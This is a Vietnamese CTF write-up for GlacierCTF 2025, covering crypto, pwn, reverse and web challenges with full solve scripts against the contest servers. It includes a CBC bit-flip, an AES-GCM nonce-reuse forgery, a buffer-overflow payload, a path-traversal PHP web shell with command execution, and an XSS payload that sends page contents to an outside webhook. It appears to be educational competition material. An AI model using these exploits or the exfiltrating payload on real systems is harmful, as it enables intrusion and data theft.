---
title: GlacierCTF 2025
published: 2025-11-25
description: "Writeup for GlacierCTF 2025."
image: "./image.png"
tags: ["Blog", "Web", "Crypto", "Pwn", "Rev", "Misc"]
category: Writeup
draft: false
---


# Crypto

## C.M.P.R.W
Source code:
```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from Crypto.Util.number import bytes_to_long
import networkx as nx

def graph(tags: list):
    assert(len(tags) == 5)
    G = nx.DiGraph()
    G.add_nodes_from(tags)
    edges = []
    for i in range(len(tags)):
        j1, j2 = (i+1) % len(tags), (i+3) % len(tags)
        edges.append((tags[i], tags[j1]))
        edges.append((tags[i], tags[j2]))
    G.add_edges_from(edges)
    return G

TAGS = ["crypto", "misc", "pwn", "rev", "web"]

GRAPH = graph(TAGS)

def result(s1: str, s2: str):
    if (s1 == s2):
        return "tie"

    if ((s1, s2) in GRAPH.edges):
        return "win"
    elif ((s2, s1) in GRAPH.edges):
        return "lose"

def RNGesus():
    state = bytes_to_long(os.urandom(8))
    while (True):
        yield state & 0xf
        for _ in range(4):
            bit = (state ^ (state >> 3) ^ (state >> 7)) & 1
            state = (state >> 1) | (bit << 63)

def main():

    n = 100

    print("Welcome to C.M.P.R.W.")
    print(f"If you win against the computer {n * 2} time in a row. You may claim our [SPECIAL] reward.")
    print("Here, have some free trials as new-comer goodies.")

    rng = RNGesus()

    for _ in range(n):
        choice = next(rng) % 5
        inp = input("Choose one of 'crypto', 'misc', 'pwn', 'rev', 'web': ")
        if (inp not in TAGS):
            print("error")
            exit(0)
        else:
            res = result(inp, TAGS[choice])
            print(res)

    for _ in range(n * 2):
        choice = next(rng) % 5
        inp = input("Choose one of 'crypto', 'misc', 'pwn', 'rev', 'web': ")
        if (inp not in TAGS):
            print("error")
            exit(0)
        else:
            res = result(inp, TAGS[choice])
            print(res)
            if (res != "win"):
                print("Sorry. Better luck next time.")
                exit(0)
    else:
        with open("flag.txt", "r") as f:
            print(f"Congratulations! Here is your prize! {f.read()}")


if __name__ == "__main__":
    SystemExit(main())
```

Phân tích một chút về bài này, server cho ta một hàm custom RNG là `RNGesus`. Hàm này sẽ sinh ra một số trong khoảng [0..15], mục đích của ta là phải **predict** được hàm này để có thể tính được giá trị mà nó trả về. Từ đó bypass được `n*2` lượt để lấy `FLAG`.

Để server trả về `win` đối với mỗi round thì ta phải chọn các lựa chọn thích hợp (tương ứng với cạnh của đồ thị mà server tạo ra).

Bài này mình đã sử dụng `z3` để **symbolic** lại hàm `RNGesus` từ đó recover lại được `seed` ban đầu. Cụ thể hơn: 
- Ban đầu khởi tạo một cái `BitVec` gồm 64-bit đại diện cho trạng thái đầu tiên `state_0`.
- Chơi thử 100 round: 
    - Cố định một lựa chọn mà mình sẽ gửi qua cả 100 round (mình chọn `crypto`).
    - Tính giá trị đầu ra tại mỗi round `i`: `output_val = current_state & 0xf`.
    - Thêm các ràng buộc từ kết quả mà server trả về.
    - Cập nhật trạng thái giống như hàm `RNGesus()` nhưng trên biểu thức **symbolic**.

Sau khi thêm các ràng buộc vào thì mình `solver.check()` để tìm `seed` ban đầu. Khi đó mình đã kiểm soát được giá trị của hàm `RNGesus()` trả về sẽ là gì rồi. Bypass `n*2` vòng và lấy `Flag`.

Solve script:
```python=
from pwn import *
from z3 import *
import time

io = remote('challs.glacierctf.com', 13375, level='debug')

TAGS = ["crypto", "misc", "pwn", "rev", "web"]

def get_winning_move(computer_idx):
    for p in range(5):
        j1 = (p + 1) % 5
        j2 = (p + 3) % 5
        if j1 == computer_idx or j2 == computer_idx:
            return TAGS[p]
    return TAGS[0]

def z3_lfsr_step(state):
    bit = (state ^ LShR(state, 3) ^ LShR(state, 7)) & 1
    new_state = LShR(state, 1) | (bit << 63)
    return new_state

def python_lfsr_step(state):
    bit = (state ^ (state >> 3) ^ (state >> 7)) & 1
    state = (state >> 1) | (bit << 63)
    return state & 0xffffffffffffffff

def solve():
    try:
        io.recvuntil(b"new-comer goodies.\n")

        solver = Solver()
        state_0 = BitVec('state_0', 64)
        current_state = state_0

        my_choice_str = TAGS[0].encode()

        start_time = time.time()

        for i in range(100):
            output_val = current_state & 0xf

            io.sendlineafter(b": ", my_choice_str)
            res = io.recvline().strip().decode()

            if res == "tie":
                solver.add(output_val % 5 == 0)
            elif res == "win":
                solver.add(Or(output_val % 5 == 1, output_val % 5 == 3))
            elif res == "lose":
                solver.add(Or(output_val % 5 == 2, output_val % 5 == 4))

            for _ in range(4):
                current_state = z3_lfsr_step(current_state)

        if solver.check() != sat:
            print("No solution found")
            return

        model = solver.model()
        recovered_state = model[state_0].as_long() & 0xffffffffffffffff
        print(f"State: {hex(recovered_state)}")

        real_state = recovered_state
        for _ in range(100):
            for _ in range(4):
                real_state = python_lfsr_step(real_state)

        winning_moves = []

        for i in range(200):
            val = real_state & 0xf
            comp_choice_idx = val % 5

            for _ in range(4):
                real_state = python_lfsr_step(real_state)

            move = get_winning_move(comp_choice_idx)
            winning_moves.append(move)

        payload = "\n".join(winning_moves)

        io.sendline(payload.encode())

        io.interactive()

    except EOFError:
        print("EOFError")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    solve()
    
# gctf{y0u_4r3_7H3_TrUE_rN635u5_n0W_7rY_j3N5H1n_1Mp4C7}
```

## crypto
Source code:
```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Respect the shebang and mark file as executable

import base64
import json
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad

def main() -> int:

    with open("/flag.txt", "r") as flag_file:
        FLAG = flag_file.read()

    # We choose a random key
    key = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC)

    print("Welcome to AES, the Authentic Engagement Solutions")
    print("The only service that we offer is to greet you")

    while True:
        print("1) Get a token")
        print("2) Redeem a previously issued token")
        print("3) Exit")

        choice = input("> ")

        try:
            choice_int = int(choice)
        except ValueError:
            print("An error occured!")
            continue

        if choice_int == 1:
            print("Hey, what's your name?")
            name = input("> ")
            token = f"admin=0;name={name}".encode()

            ct_bytes = cipher.encrypt(pad(token, AES.block_size))
            iv = base64.b64encode(cipher.iv).decode()
            ct = base64.b64encode(ct_bytes).decode()
            token_enc = json.dumps({'iv':iv, 'ct':ct})

            print(f"Here is your token: {token_enc}")

        elif choice_int == 2:
            print("Hey, what's your token?")
            token_str = input("> ")
            token = json.loads(token_str)

            iv = base64.b64decode(token['iv'])
            ct = base64.b64decode(token['ct'])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size).decode()

            token_content = {
                part.split("=")[0]: part.split("=")[1]
                for part in pt.split(";")
            }

            print(token_content)
            print(f"Hey {token_content['name']}, thanks for using our service :)")

            if token_content["admin"] != "0":
                print(f"You seem to be admin, take this: {FLAG}")

        elif choice_int == 3:
            print("Thanks for using AES. See you again soon")
            break
        else:
            print("I don't know what you want :(")

    return 0

if __name__ == '__main__':
    raise SystemExit(main())
```
Bài này khá đơn giản, với `choice = 1` thì server sẽ trả về cho ta một token là mã hóa của `admin=0;name=.....`. Còn `choice = 2` thì ta được phép gửi `iv, ct` làm sao để sau khi giải mã kết quả sẽ chứa `admin != 0`. 
Vì đây là mã hóa `AES-CBC`:
![image](https://hackmd.io/_uploads/Hk5x5_W-bg.png)
Nên nếu ta thay 1 bytes ở `IV` thì bytes nằm ở vị trí tương ứng của `plaintext` sẽ cũng bị thay đổi. Từ đó ta chỉ cần tìm một giá trị thích hợp để sau khi mã hóa `admin=1` là được.

Solve script:
```python=
import base64
import json
from pwn import *

# io = process(['python3', '/home/team/CTF Cryptography/crypto/challenge'], level='debug')
io = remote('challs.glacierctf.com', 13387, level='debug')

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"A")
token = io.recvline_contains(b"Here is your token: ").strip().decode().split("token: ")[1]
iv = base64.b64decode(json.loads(token)['iv'])
ct = base64.b64decode(json.loads(token)['ct'])

modified_iv = bytearray(iv)
modified_iv[6] = modified_iv[6] ^ ord('0') ^ ord('1')
modified_token = json.dumps({
    'iv': base64.b64encode(bytes(modified_iv)).decode(),
    'ct': base64.b64encode(ct).decode()
})

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", modified_token.encode())
io.recvline()
response = io.recvline().decode()

# gctf{fa81f9cb_w3lc0me_t0_cr1pt0_415a74a1}
```

## Noisy Neighbour
Source code:
```python!
import random
from Crypto.Util.number import getPrime, long_to_bytes
from Crypto.Cipher import AES

ticket = random.getrandbits(128)
FLAG = ""
with open('flag.txt', 'r') as flag:
    FLAG = flag.read()

p = getPrime(1024)
q = getPrime(1024)
N = p * q
phi = (p - 1) * (q - 1)

e = getPrime(16) + (random.getrandbits(128) * phi)
enc_ticket = pow(ticket, e, N)

print(f"{N=}")
print(f"{e=}")
print(f"{enc_ticket=}")

cipher = AES.new(long_to_bytes(ticket), AES.MODE_CTR)
nonce = cipher.nonce
enc_flag = cipher.encrypt(FLAG.encode())

print(f"{enc_flag, nonce=}")
```
Đây là một bài RSA với số mũ `e` khá lớn. Làm một số phép biến đổi:
\begin{gather*}
e = e_0 + k \cdot \phi(N) \\
\Rightarrow e \approx k \cdot \phi(N) \ \ \ \ (\text{vì e khá nhỏ}) \\
\Rightarrow e \approx k \cdot N \\
\Rightarrow k \approx \lfloor \frac{e}{N} \rfloor \\
\Rightarrow k = \frac{e}{N} + 1 \\
\Rightarrow e_0 = e \pmod k \\
\Rightarrow \phi(N) = \frac{e - e_0}{k}
\end{gather*}

Khi tính được $\phi(n)$ rồi thì việc còn lại rất đơn giản là giải RSA như thông thường.

Solve script:
```python=
from Crypto.Util.number import *
from Crypto.Cipher import AES

N=10347242542600406308094534195263088635791365996714020803160250407603636995099715433829129670160192589093770515128152510439089971458386641765448309859819378023880272965050178277879093516918807566027042642100169240017844173793930784667163759562215010481356537422986546632994001754291723194969521748076910835396937977810627980887157551885113202531423733595088875369751631232226097581969479909313254958049277471499732135617616297332871531530596176518111563310557213028740425533103112982126293232786326119238512934754974514742881890899165547139605333761970683944591937361699420431036603767467012489183290578309164784178633
e=3311986667073495779819661492647781665180928338729865042826968893121477288104028672415705332665972755867861711304085148957997662937288947383110908043717598599426017484422084809208910486092822909662298925085867663251659781025068175951771651187222278814345138470007111789992552003468482347964267103806504197977364231330649526292875722283219443425291497285240653190201781346512871589039622122806771109809220085787813190940121150761761463256791250036396820146924876913040030532187290384737376868592733044732294197676117676820815598675412056870600146382869883717018539905436358459822165326225070894181935206514146099686162267119751019096873609300804816456005907
enc_ticket=3946420937017846250393019311609396457338463614723557172414418971956390767261563151514428488890805225021688212721862533753952638354812535035364278722859438604041154655180097577414599710778354857775161040850623041785446044819204867397065653667589062151439260152909905577160138599029484856249429267771263679704326352858922042179435551285375575126876142413991900659195467217772357193174598528534725223102658732326697336473387891654610296170800740197748092566321210843941286260968460061251471684295914144882122101706465054524774059725005866235986370176677629767819073609117398726398647883974883695216900279944685266429904
enc_flag, nonce=(b'`\x8d\x9e\x1e\xd4!\xf5\xe3\xf8,\xfb\x16UV\xcc\xae\xe6G\x91F\x06\x157)\x99|;\xb0\xf5\x87\xa2R\xa8\xd4H\xd16\xa6\xd6\xd1r\xe7 C\xd6i\x83\xb9\xf9\xf7f=\xab\x16', b'\xf1\xdbF)\x91\xc5\xb4$')

k = (e // N) + 1
e_prime = e % k
phi = (e - e_prime) // k

d = inverse(e_prime, phi)
ticket = pow(enc_ticket, d, N)

cipher = AES.new(long_to_bytes(ticket), AES.MODE_CTR, nonce=nonce)
flag = cipher.decrypt(enc_flag)
print(flag)

# gctf{c0pp3rsm17h_ste4ling_y0ur_sm4ll_r00ts_2025-2079}
```

## AES zippy
Source code: 
```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import zlib
import base64
from Crypto.Cipher import AES

KEY = os.urandom(16)
USED_NONCES = []
ADMIN_SECRET = b"Glacier CTF Open"
ADMIN_LOGS = ""
NORMAL_LOGS = ""
MAX_STORAGE = 1 << 16


def decrypt(ct: bytes, nonce: bytes, tag: bytes) -> bytes:
    ad = b"GlacierCTF2025"

    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    cipher.update(ad)
    try:
        decrypted = cipher.decrypt_and_verify(ct, tag)
    except:
        raise ValueError("Invalid tag")

    return decrypted


def encrypt(pt: bytes, nonce: bytes = os.urandom(16)):
    ad = b"GlacierCTF2025"

    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    cipher.update(ad)

    ct, tag = cipher.encrypt_and_digest(pt)

    return ct, nonce, tag


def test_init():
    global ADMIN_LOGS

    pt = b"Hello GlacierCTF"

    ct, nonce, tag = encrypt(pt)
    assert pt == decrypt(ct, nonce, tag)

    ADMIN_LOGS += f"[+] Nonce: {base64.b64encode(nonce).decode()}\n"
    ADMIN_LOGS += f"[+] Tag: {base64.b64encode(tag).decode()}\n"


def get_size() -> int:
    global ADMIN_LOGS, NORMAL_LOGS, USED_NONCES

    full_state: bytes = ADMIN_LOGS.encode() + NORMAL_LOGS.encode()

    return len(zlib.compress(full_state)) + len(USED_NONCES)*16


def print_help():
    print("[0] Encrypt a file")
    print("[1] Access admin files")


def main():
    global NORMAL_LOGS
    print("[+] Welcome to the Glacier encryption service")
    test_init()
    while get_size() < MAX_STORAGE:
        try:
            print_help()
            choice = int(input("Choose action:\n> "))
            if choice == 0:
                pt = bytes.fromhex(input("Plaintext:\n> "))
                nonce = bytes.fromhex(input("Nonce:\n> "))

                if nonce in USED_NONCES or ADMIN_SECRET in pt:
                    return

                USED_NONCES.append(nonce)
                ct, nonce, tag = encrypt(pt, nonce)

                NORMAL_LOGS = f"{pt.hex()=} = {ct.hex()=}, {tag.hex()=}"
                print(NORMAL_LOGS)
                NORMAL_LOGS = f"{pt}"

                print(f"[+] Storage left: {get_size()}/{MAX_STORAGE} bytes")
            elif choice == 1:
                ct = bytes.fromhex(input("Ciphertext:\n> "))
                nonce = bytes.fromhex(input("Nonce:\n> "))
                tag = bytes.fromhex(input("Tag:\n> "))

                pt = decrypt(ct, nonce, tag)

                if ADMIN_SECRET in pt:
                    print("[+] Access granted to admin files!")
                    with open("flag.txt", "r") as flag:
                        print(f"{flag.read()}")
                return
            else:
                return
        except:
            return
    return


if __name__ == "__main__":
    main()
```
Bug chính của bài này đó chính là việc server đã sử dụng `nonce, tag` trong hàm `test_init()` nhưng lại không lưu `nonce` và `USED_NONCES`. Điều đó làm cho ta có thể đi theo hướng là recover lại 2 tham số đó, sau đó sử dụng `nonce` đó để mã hóa dữ liệu riêng của ta. Từ đó bài toán trở thành `reuse nonce in AES-GCM` (xem chi tiết ở [đây](https://frereit.de/aes_gcm/)).

Vậy làm sao để recover lại `nonce, tag` của `admin` ?

Ta nhận thấy ở `choice = 0`, server sẽ tính `get_size()` (function này sử dụng hàm `zlib.compress` để nén lại và trả về độ dài sau khi nén) cho ta biết giá trị đó. Đây chính là một cái **Oracle** mà ta có thể exploit để recover. 

Mục tiêu của chính là làm rò rỉ các chuỗi `Base64` của `nonce, tag` được in ra trong `ADMIN_LOGS`. Ta đã biết, kích thước của chuỗi sau khi `zlib.compress` sẽ thay đổi nếu chuỗi ta gửi (`NORMAL_LOGS`) khớp một phần với `ADMIN_LOGS`. Từ đó, ta sẽ thử gửi từng kí tự trong `Base64`, nếu như hàm nén trả về độ dài ngắn hơn thì chứng tỏ nó sẽ giống với phần prefix là `ADMIN_LOGS` hơn. 

Sau khi recover được `nonce, tag` của `admin` rồi. Việc còn lại là sử dụng kĩ thuật `forge tag` của AES-GCM trong ngữ cảnh **reuse nonce**. 

```python=
from pwn import *
import string
import sys
import forbidden_attack

context.log_level = 'error'
context.timeout = 5

REQUEST_COUNT = 0

def get_size(io, payload):
    global REQUEST_COUNT
    try:
        io.sendline(b"0")

        io.sendlineafter(b"Plaintext:\n> ", payload.hex().encode())

        nonce = os.urandom(16)
        io.sendlineafter(b"Nonce:\n> ", nonce.hex().encode())

        REQUEST_COUNT += 1

        io.recvuntil(b"Storage left: ")
        line = io.recvline().decode().strip()
        raw_size = int(line.split('/')[0])

        compressed_size = raw_size - (REQUEST_COUNT * 16)

        io.recvuntil(b"Choose action:\n> ")

        return compressed_size
    except:
        return 999999

def leak_secret(io, prefix):
    known = prefix
    charset = string.ascii_letters + string.digits + "+/="

    global REQUEST_COUNT

    while True:
        candidates = {}

        payloads = []
        for char in charset:
            probe = (known + char).encode()
            payloads.append((char, probe))

        for char, probe in payloads:
            io.sendline(b"0")
            io.sendline(probe.hex().encode())
            nonce = os.urandom(16)
            io.sendline(nonce.hex().encode())

        for i, (char, probe) in enumerate(payloads):
            try:
                REQUEST_COUNT += 1

                io.recvuntil(b"Storage left: ")
                line = io.recvline().decode().strip()
                raw_size = int(line.split('/')[0])

                compressed_size = raw_size - (REQUEST_COUNT * 16)

                io.recvuntil(b"Choose action:\n> ")

                candidates[char] = compressed_size
            except:
                return known[len(prefix):]

        min_size = min(candidates.values())
        best_chars = [c for c, s in candidates.items() if s == min_size]

        if len(best_chars) == 1:
            best_char = best_chars[0]
            known += best_char

            if best_char == "\n" or len(known) > 100:
                break

            if best_char == "=":
                pass

            if len(known) - len(prefix) >= 24:
                break
        else:
            break

    return known[len(prefix):]

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def main():
    if args.REMOTE:
        io = remote("challs.glacierctf.com", 13373, level='debug')
    else:
        io = process(['python3', 'challenge'])

    io.recvuntil(b"Choose action:\n> ")

    try:
        nonce_b64 = leak_secret(io, "[+] Nonce: ")
        tag_b64 = leak_secret(io, "[+] Tag: ")

        nonce_admin = base64.b64decode(nonce_b64.strip())
        tag_admin = base64.b64decode(tag_b64.strip())

        P_admin = b"Hello GlacierCTF"

        io.sendline(b"0")

        P_ours = b"A" * 16
        io.sendlineafter(b"Plaintext:\n> ", P_ours.hex().encode())

        io.sendlineafter(b"Nonce:\n> ", nonce_admin.hex().encode())

        global REQUEST_COUNT
        REQUEST_COUNT += 1

        line = io.recvline().decode().strip()

        import re
        m_ct = re.search(r"ct\.hex\(\)='([0-9a-f]+)'", line)
        m_tag = re.search(r"tag\.hex\(\)='([0-9a-f]+)'", line)

        C_ours_hex = m_ct.group(1)
        Tag_ours_hex = m_tag.group(1)

        C_ours = bytes.fromhex(C_ours_hex)
        Tag_ours = bytes.fromhex(Tag_ours_hex)

        io.recvuntil(b"Storage left: ")
        io.recvline()
        io.recvuntil(b"Choose action:\n> ")

        K = xor_bytes(C_ours, P_ours)

        C_admin = xor_bytes(P_admin, K)

        possible_keys = list(forbidden_attack.recover_possible_auth_keys(
            b"", C_admin, tag_admin,
            b"", C_ours, Tag_ours
        ))

        ADMIN_SECRET = b"Glacier CTF Open"
        P_flag_request = ADMIN_SECRET
        if len(P_flag_request) < 16:
            P_flag_request += b'\x00' * (16 - len(P_flag_request))

        C_flag_request = xor_bytes(P_flag_request, K)

        for i, H in enumerate(possible_keys):
            Tag_flag_request = forbidden_attack.forge_tag(
                H,
                b"", C_admin, tag_admin,
                b"", C_flag_request
            )

            io.sendline(b"1")
            io.sendlineafter(b"Ciphertext:\n> ", C_flag_request.hex().encode())
            io.sendlineafter(b"Nonce:\n> ", nonce_admin.hex().encode())
            io.sendlineafter(b"Tag:\n> ", Tag_flag_request.hex().encode())

            response = io.recvall(timeout=2).decode()
            return response
    except:
        return ""
    finally:
        io.close()

if __name__ == "__main__":
    print(main())

# gctf{ZiPPY_iS_0UT_heRE_5NItchin6_on_@lL_tHE_nONC3s}
```



# PWN
## pwn
Source code:
```cpp=
#include <stdio.h>
#include <stdlib.h>

void win() {
  FILE *f = fopen("/flag.txt", "r");
  if(f == NULL)
    exit(1);

  char flag[256];
  char *r = fgets(flag, 256, f);
  printf("%s\n", flag);
}

void challenge() {
  char buf[0666];
  printf("Enter your input now:\n");
  fread(buf, 1, 666, stdin);
}

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin,  NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  challenge();

  return 0;
}
```
Bài này có một lỗi buffer overflow ở hàm `fread`, hàm đang read 666 bytes trong khi biến `buf` chỉ có 0666 (octal) = 438 (decimal) bytes.
Như vậy, chúng ta có thể ghi đè return address của hàm `challenge()` để jump về hàm `win()`.
Trước tiên, check security của file binary:
- `PIE off` -> address của `win()` ở local sẽ giống trên server.
- `Canary off` -> không cần leak canary.
 
![image](https://hackmd.io/_uploads/ryskadWb-x.png)
Check địa chỉ của `win()` là `0x4011d6`.
![image](https://hackmd.io/_uploads/HkyKvTWZ-x.png)
Bây giờ, chúng ta sẽ check offset giữa `buf` và return address. Có thể thấy được, `challenge` dành cho biến local 0x1c0 = 448 btyes.
![image](https://hackmd.io/_uploads/Hy3npuWbZx.png)
Vậy payload là `448 bytes junk` + `8 bytes rbp` + `win() address` + `202 bytes junk`.

Solve Script:
```python!
from pwn import *

s = remote('challs.glacierctf.com', 13388)
print(s.recvuntil(b'Enter your input now:\n'))

payload  = b'A' * (448+8)
payload += p64(0x4011d6)   
payload += b'A' * (666-len(payload)) 

s.send(payload)
print(s.recvall().decode())

# gctf{3097324b_w3lc0me_t0_pwn_e1dab08a}
```
# Reverse

## rev

Logic là bài sẽ cho khá nhiều flag nhưng chỉ lấy flag ở index 592 để check

![image](https://hackmd.io/_uploads/r1K7qWGbZg.png)

Và nó đây

![image](https://hackmd.io/_uploads/H1cBqWM-bg.png)



## Wisdom
Bài này cho chúng ta một file binary, khi sử dụng IDA, chúng ta sẽ thấy được có hàm `check_flag()`
```cpp=
_BOOL8 __fastcall check_flag(_BYTE *a1)
{
  __int64 i; // rdx

  for ( i = 0; i != 46; ++i )
    a1[i] = MAGIC + (KEY[i] ^ a1[i]) - i;
  return memcmp(a1, &FLAG, 0x2Eu) == 0;
}
```
Chỉ cần extract các giá trị `MAGIC`, `KEY[]` và `FLAG` thì chúng ta có thể reverse lại được flag.

Solve script:
```python!
from pwn import xor

MAGIC = "5e"
KEY = '36d1d9db89a5bede5ee60f12021ae1c00b4ca3b008e9a0d0d1ea88712387d041d80409a2fd2002280d758d66a85c000000000000000000000000000000000000'
CHECK_FLAG = 'af0f09184c473344640ebc75bda5d6eea0c9223ab9cf3cd6ebe7fd45bef820b02b6ea7fe02497384a278f088c252'

m = int(MAGIC, 16)
k = bytes.fromhex(KEY)
c = bytes.fromhex(CHECK_FLAG)

flag = ''.join([xor(c[i] - m + i, k[i]).decode() for i in range(len(c))])
print(flag)

# gctf{Ke3P_g0iNg_Y0u_goT_tH1s_00055ba509ea6138}
```


# Web

## web

![image](https://hackmd.io/_uploads/ryhuFbMbbe.png)


Bài này mình đọc source và thấy creds như sau

```json
[
  {
    "username": "test",
    "password": "test",
    "moderator": false
  },
  {
    "username": "alice",
    "password": "WpYcHA1li7@*$Z%mp&W#3ZYIYPw1iVkj",
    "moderator": false
  },
  { 
    "username": "admin",
    "password": "!UCA3P4*Dg@nam4L!oodQK4@TjmC9cnh",
    "moderator": true
  }
]

```


Thử đăng nhập admin ai ngờ được luôn

![image](https://hackmd.io/_uploads/SkBHtWf-Ze.png)



## Glacier ToDo

Source:

```php
<?php

session_start();
header("Content-Type: application/json");
$start = microtime(true);

define("TODOS", "/tmp/todos");
define("USERS", "/tmp/users.json");
define("SESS", "LOGIN_ID");
if(!file_exists(USERS)) file_put_contents(USERS, "[]"); 
if(!is_dir(TODOS)) mkdir(TODOS);

$res = array();
$data = array();
$status = 1;
$path = $_GET["path"];

if($path === "/todos/list") {
  $isLoggedIn = isset($_SESSION[SESS]);
  if(!$isLoggedIn) goto fail;
  $user = $_SESSION[SESS];
  if(!file_exists(TODOS . "/" . $user)) file_put_contents(TODOS . "/" . $user, "[]");
  $todos = json_decode(file_get_contents(TODOS . "/" . $user), true);
  $data["todos"] = array_values($todos);
} elseif($path === "/todos/add") {
  $isLoggedIn = isset($_SESSION[SESS]);
  if(!$isLoggedIn) goto fail;
  $user = $_SESSION[SESS];
  if(!file_exists(TODOS . "/" . $user)) file_put_contents(TODOS . "/" . $user, "[]");
  $todos = json_decode(file_get_contents(TODOS . "/" . $user));
  $name = isset($_POST["name"]) ? filter_input(INPUT_POST, "name") : '';
  $desc = isset($_POST["desc"]) ? filter_input(INPUT_POST, "desc") : '';
  $todos[] = array(
    "id" => uniqid(),
    "name" => $name,
    "desc" => $desc
  );
  file_put_contents(TODOS . "/" . $user, json_encode(array_values($todos)));
} elseif($path === "/todos/remove") {
  $isLoggedIn = isset($_SESSION[SESS]);
  if(!$isLoggedIn) goto fail;
  $user = $_SESSION[SESS];
  if(!file_exists(TODOS . "/" . $user)) file_put_contents(TODOS . "/" . $user, "[]");
  $todos = json_decode(file_get_contents(TODOS . "/" . $user));
  $id = isset($_POST["id"]) ? filter_input(INPUT_POST, "id") : '';
  file_put_contents(TODOS . "/" . $user, json_encode(array_values(array_filter($todos, function($item) use($id) {
    return $item->id !== $id;
  }))));
} elseif($path === "/account/info") {
  $isLoggedIn = isset($_SESSION[SESS]);
  $data["loggedIn"] = $isLoggedIn;  
  $data["username"] = $_SESSION[SESS];  
} elseif($path === "/account/login") {
  $username = isset($_POST["username"]) ? filter_input(INPUT_POST, "username") : '';
  $password = isset($_POST["password"]) ? filter_input(INPUT_POST, "password") : '';
  $users = json_decode(file_get_contents(USERS));
  foreach($users as $user)
    if($user->username === $username && password_verify($password, $user->password))
      goto valid_login;
  goto fail;
  valid_login:
  $_SESSION[SESS] = $username;
} elseif($path === "/account/register") {
  $username = isset($_POST["username"]) ? filter_input(INPUT_POST, "username") : '';
  $password = isset($_POST["password"]) ? filter_input(INPUT_POST, "password") : '';
  $users = json_decode(file_get_contents(USERS));
  foreach($users as $user)
    if($user->username === $username) goto fail;

  $users[] = array(
    "username" => $username,
    "password" => password_hash($password, PASSWORD_DEFAULT)
  );
  file_put_contents(USERS, json_encode($users));
} else {
  http_response_code(404);
}

goto end;
fail:
http_response_code(500);
$status = 0;
end:
$end = microtime(true);
$res["data"] = $data;
$res["success"] = $status;
$res["exec_time"] = $end - $start;
echo json_encode($res);
```

Source có vẻ dài nhưng ta có thể thấy lỗi nằm ở đây:

```php
} elseif($path === "/todos/add") {
  $isLoggedIn = isset($_SESSION[SESS]);
  if(!$isLoggedIn) goto fail;
  $user = $_SESSION[SESS];
  if(!file_exists(TODOS . "/" . $user)) file_put_contents(TODOS . "/" . $user, "[]");
  $todos = json_decode(file_get_contents(TODOS . "/" . $user));
  $name = isset($_POST["name"]) ? filter_input(INPUT_POST, "name") : '';
  $desc = isset($_POST["desc"]) ? filter_input(INPUT_POST, "desc") : '';
  $todos[] = array(
    "id" => uniqid(),
    "name" => $name,
    "desc" => $desc
  );
```

Ta thấy TODOS được add với "/" và tên user nên ta có thể path traversal tại đây và ghi vào file php.

Đầu tiên ta tạo user `../../../../../../var/www/html/a.php`

![image](https://hackmd.io/_uploads/BybcSbzb-e.png)

Sau đó add note với nội dung `<?php system($_GET['cmd']);?>`

![image](https://hackmd.io/_uploads/ryOaS-zbbe.png)

Vào endpoint 

`/a.php?cmd=cat /flag.txt`

![image](https://hackmd.io/_uploads/H1geLWG-Zx.png)



## Glacier AI Store

Giao diện trang web:

![image](https://hackmd.io/_uploads/HJ0YzZz--l.png)

Có thể thấy web cho ta 1 coin, nhưng để có flag phải cần 1000 coin. Thử order 1 stone và đã hết tiền

![image](https://hackmd.io/_uploads/B1xFfWGZbg.png)

Sau một hồi fuzz thì mình có thể race-condition sử dụng 2 hoặc 3 session để order 2 đơn và bán đi sẽ tăng coin

![image](https://hackmd.io/_uploads/HkWDEWfZ-x.png)

Thế là đã có 2 đơn bây giờ bán đi là sẽ tăng coin, cứ lặp lại và khi đủ 10 coin, 100 coin thì tăng mục tiêu lên và cuối cùng lấy được flag.


## Glacier Echo

Ta có endpoint /echo cho phép nhập vào Content-Type và content

![image](https://hackmd.io/_uploads/SknFUWzZZl.png)

Nhưng Content-Type chỉ cho phép text/plain

```python
@csrf_exempt
def echo(request):
    current_user = get_current_user(request)
    if not current_user:
        return HttpResponse(
            "Error: Authentication required. Please login first.", status=401
        )

    content_type = request.GET.get("type", "text/plain")
    parsed_type = parse_options_header(content_type)[0]

    if parsed_type != "text/plain":
        return HttpResponse("Error: Only text/plain are allowed!", status=403)

    message = request.GET.get("message", "")

    try:
        new_echo = Echo.objects.create(
            message=message,
            content_type=content_type,
            ip_address=request.META.get("REMOTE_ADDR"),
            base_station_id=current_user.get("base_station_id"),
        )
        logger.info(
            f"Saved echo to database for(station: {current_user.get('station_id', 'admin')})"
        )
    except Exception as e:
        logger.error(f"Failed to save echo to database: {e}")

    echo_response = f"{message}\n{message}\n{message}"

    response = HttpResponse(echo_response)
    response["Content-Type"] = content_type
    return response
```

Sau một hồi fuzz thì mình tìm được một payload có thể bypass và chuyển content-type về text/html

`/echo?message=<script>alert(1)</script>&type=text/plain;,text/html`


![image](https://hackmd.io/_uploads/BkbwubfbWe.png)

Ok ngon rồi bây giờ ta có payload để xss như sau:

```html
<script>fetch('/control-center').then(r=>r.text()).then(d=>fetch('https://webhook.site/f847fb46-6303-4159-ad63-949a4ed261fb/?a=c',{method: "POST",body:encodeURIComponent(d)}))</script>
```

Add vào và report

![image](https://hackmd.io/_uploads/rkVjd-M-Zg.png)

Check flag trong content

![image](https://hackmd.io/_uploads/BJrCuZMb-g.png)

# Misc

## gitresethard
Challenge cho một repo của github cần được recovery lại sau khi bị reset hard.
Bài này sử dụng `git fsck --dangling` để check các commit không còn được trỏ tới. Khi đó, sẽ thấy được một commit lạ.
![image](https://hackmd.io/_uploads/rJmx_-NW-e.png)
Khi `git checkout` tới commit đó, thì thấy được hint mà description để lại
